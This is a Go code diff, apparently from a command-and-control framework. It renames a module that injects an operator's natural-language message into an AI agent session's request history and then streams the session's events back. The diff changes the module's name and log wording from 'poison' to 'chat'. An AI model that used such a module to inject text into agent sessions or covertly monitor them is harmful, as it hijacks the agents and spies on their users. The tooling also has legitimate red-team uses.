@@ -8,17 +8,17 @@ import (
 	log "github.com/sirupsen/logrus"
 )
 
-// PoisonModule handles the "agent" C2 command by injecting a natural-language
-// message into the session's request history (poison injection).
-type PoisonModule struct{}
+// ChatModule handles the "chat" C2 command by injecting a natural-language
+// message into the session's request history.
+type ChatModule struct{}
 
-func (m *PoisonModule) Name() string { return "agent" }
+func (m *ChatModule) Name() string { return "chat" }
 
-func (m *PoisonModule) Handle(ctx ModuleContext, sessionID string, taskID uint32, spite *implantpb.Spite) {
+func (m *ChatModule) Handle(ctx ModuleContext, sessionID string, taskID uint32, spite *implantpb.Spite) {
 	req := spite.GetRequest()
 	if req == nil || req.Input == "" {
-		ctx.SendSpite(sessionID, taskID, execSpite("missing poison text"))
-		ctx.Tasks.Fail(sessionID, taskID, "missing poison text")
+		ctx.SendSpite(sessionID, taskID, execSpite("missing chat text"))
+		ctx.Tasks.Fail(sessionID, taskID, "missing chat text")
 		return
 	}
 
@@ -32,22 +32,22 @@ func (m *PoisonModule) Handle(ctx ModuleContext, sessionID string, taskID uint32
 	}
 
 	if ctx.WaitForSession(sessionID, DefaultSessionTimeout) == nil {
-		log.Errorf("[bridge] failed to enqueue poison message for session %s: session not found", sessionID)
+		log.Errorf("[bridge] failed to enqueue chat message for session %s: session not found", sessionID)
 		ctx.Tasks.Fail(sessionID, taskID, "session not found")
 		return
 	}
 
 	if !sessions.Global().EnqueueAction(sessionID, action) {
-		log.Errorf("[bridge] failed to enqueue poison message for session %s", sessionID)
+		log.Errorf("[bridge] failed to enqueue chat message for session %s", sessionID)
 		ctx.Tasks.Fail(sessionID, taskID, "enqueue failed")
 		return
 	}
 
-	log.Infof("[bridge] enqueued poison task %d msg %s for session %s", taskID, msgID, sessionID)
+	log.Infof("[bridge] enqueued chat task %d msg %s for session %s", taskID, msgID, sessionID)
 
 	// Activate tapping so subsequent observe events are streamed back.
 	ctx.TappingSet(sessionID, taskID)
-	log.Infof("[bridge] tapping activated for poison session %s (taskID=%d)", sessionID, taskID)
+	log.Infof("[bridge] tapping activated for chat session %s (taskID=%d)", sessionID, taskID)
 
 	ctx.Tasks.Complete(sessionID, taskID)
 }
